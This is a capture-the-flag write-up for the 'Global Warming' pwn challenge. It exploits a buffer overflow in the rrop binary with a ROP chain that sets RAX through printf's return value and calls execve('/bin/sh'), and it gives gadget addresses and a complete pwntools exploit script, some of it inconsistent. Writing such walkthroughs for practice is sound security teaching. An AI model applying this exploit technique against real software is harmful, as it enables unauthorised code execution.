# Writeup for Global Warming (Pwn) Challenge

### Info
```
Description : You came this far using Solar Designer technique and advance technique, now you are into the gr4n173 world where you can't win just with fake rope/structure but here you should fake the signal which is turing complete.

File : rrop: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=9031d67e25112061a3f59a630a4da011a25bd4df, not stripped

Checksec :
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```
### Analysis

This is the decompilation code of the binary. <br>
The main takes 0x1388 bytes from stdin into a 0xD0 buffer. Classic Buffer Overflow Vulnerability and it prints the start address of our buffer.<br>
```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [rsp+0h] [rbp-D0h]

  nvm_init(*(_QWORD *)&argc, argv, envp);
  nvm_timeout();
  printf(
    "Hello pwners, it's gr4n173 wired machine.\n"
    "Can you change the behaviour of a process, if so then take my Buffer  @%p, from some part of my process.\n",
    &buf);
  read(0, &buf, 0x1388);
  return 0;
}
```
There is a function named UsefulFunction which provides us with a <b> syscall ; ret </b> gadget. So lets try to create a execve rop chain. 
```asm
push    rbp
mov     rbp, rsp
syscall                 ; LINUX -
retn
```

### Exploit

```
Name            : execve
rax             : 0x3b
rdi             : const char *name -> pointer to /bin/sh
rsi             : const char *const *argv -> "-c"
rdx             : const char *const *envp -> NuLL
```
We need to accomplish this by creating a ROP chain. Looking at gadgets i did not find any gadget which can control rax. So i used some fancy ROP trick.
First let us write the string "/bin/sh" to bss address. We can do that by calling read on bss address.

```python
padding = 'a' * 216

write_bin_sh = flat([

  padding,
  ret,
  pop_rdi,
  0x0,
  pop_rsi_r15,
  bss_addr,
  0xdeadbeef,
  exe.sym['read'],
  exe.sym['main']

])

exploit = padding + ret + write_bin_sh
io.sendline('/bin/sh\x00')
```
This rop chain will write "/bin/sh" to bss_addr and return to main once again nothing special here, Just some basic ROP technique :)

### Controlling RAX Register

So lets debug the binary with gdb. I have setup a breakpoint in the print statement [0x40081A].

![imgbb](https://i.ibb.co/HYB6pVs/before-printf.jpg)

Step one instruction.

![imgbb](https://i.ibb.co/x8M5yYT/after-printf.jpghttps://i.ibb.co/x8M5yYT/after-printf.jpg)

So why is RAX -> 0x9f ? This is what the binary printed.  
```
>>> hex(len("Hello pwners, it's gr4n173 wired machine.\nCan you change the behaviour of a process, if so then take my Buffer  @0x7ffe3a4f6130, from some part of my process.\n"))
==> '0x9f'
```
RAX stores the return value and the return value here is 0x9f the strlen of the contents printed to stdout. So we can call printf to print 0x3b characters to set RAX to our desired value. Basically this is what we will be doing `printf("%59c")` this will print 59 bytes of white spaces thereby setting the RAX to 0x3b.
So lets also write "%000059c" at the bss and call printf with RDI -> pointer to our string and RSI -> NuLL.

```python
write_bin_sh = flat([

  padding,
  ret,
  pop_rdi,
  0x0,
  pop_rsi_r15,
  bss_addr,
  0xdeadbeef,
  exe.sym['read'],
  exe.sym['main']

])

io.recvline()
io.recvline()

io.sendline(write_bin_sh)
io.sendline("%000059c\x00\x00\x00\x00\x00\x00\x00\x00/bin/sh\x00") # write %000059c some null characters and /bin/sh at the end

io.recvline()
io.recvline()

printf_fmt = bss_addr       # %000059c
null_char = bss_addr + 8    # Null chars
bin_sh = bss_addr + 16      # /bin/sh

set_rax = flat([

  padding,
  pop_rdi,
  printf_fmt,
  pop_rsi_r15,
  null_char,
  0xdeadbeef,
  exe.sym['printf'],
  0xdeadbeef                # return to 0xdeadbeef... basically seg faulting after our rop chain.

])


io.send(set_rax)
io.recv()

```
![imgbb](https://i.ibb.co/3pchbtk/control-rax.jpg)

### Summing up all together and executing shell

Now that we have set RAX to 0x3b, We can do a pop rdi and place the bin_sh string to it and pop rsi and set it to NuLL.

```python
setup_execve = flat([

  pop_rdi,
  bin_sh,
  pop_rsi_r15,
  0x0,
  0x0,
  syscall_ret

])
```

The complete exploit script.
```python
#!/usr/bin/python
io = remote('rrop.darkarmy.xyz', '7001')

pop_rdi = 0x00000000004008b3
ret = 0x00000000004005b6
bss_addr = 0x6011a0
syscall_ret = 0x00000000004007d2
pop_rsi_r15 = 0x00000000004008b1
padding = 'a' * 216

write_bin_sh = flat([

  padding,
  ret,
  pop_rdi,
  0x0,
  pop_rsi_r15,
  bss_addr,
  0xdeadbeef,
  exe.sym['read'],
  exe.sym['main']

])

io.recvline()
io.recvline()

io.sendline(write_bin_sh)
io.sendline("%000059c\x00\x00\x00\x00\x00\x00\x00\x00/bin/sh\x00")

io.recvline()
io.recvline()

printf_fmt = bss_addr
null_char = bss_addr + 8
bin_sh = bss_addr + 16

set_rax = flat([

  padding,
  pop_rdi,
  printf_fmt,
  pop_rsi_r15,
  null_char,
  0xdeadbeef,
  exe.sym['printf'],
  ret

])

setup_execve = flat([

  pop_rdi,
  bin_sh,
  pop_rsi_r15,
  0x0,
  0x0,
  syscall_ret

])

exploit = set_rax + setup_execve

io.send(exploit)
io.recv()
io.interactive()
```
![imgbb](https://i.ibb.co/LnyD0n8/shell.png)<br>
`Flag : darkCTF{f1n4lly_y0u_f4k3_s1gn4l_fr4m3_4nd_w0n_gr4n173_w1r3d_m4ch1n3}`<br>
![imgbb](https://i.ibb.co/Wkdgytk/jIk1rJT.jpg)